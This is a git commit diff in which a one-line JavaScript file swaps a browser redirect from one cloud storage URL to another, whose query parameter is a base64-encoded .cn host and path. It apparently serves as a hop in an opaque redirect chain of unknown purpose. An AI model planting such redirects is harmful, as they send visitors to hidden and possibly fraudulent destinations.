406ddc7c98d5cc24d73438d8116a009e4364ca6e
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-01 15:33:05 +0800

    Update 2.js

--- 2.js
+++ 2.js
@@ -1,1 +1,1 @@
-window.location.href='https://maoaa.bd.bcebos.com/Tesla?id=IGg1bVd9ABNP7cMfT3yWkpanXqEmQFZh'
+window.location.href='http://s15-video.s3.cn-east-2.jdcloud-oss.com/989?d=cjgua2ZnaHl1ZGUxMzkuY258MTYyNXwveC8xNjI1L2hpOGg='
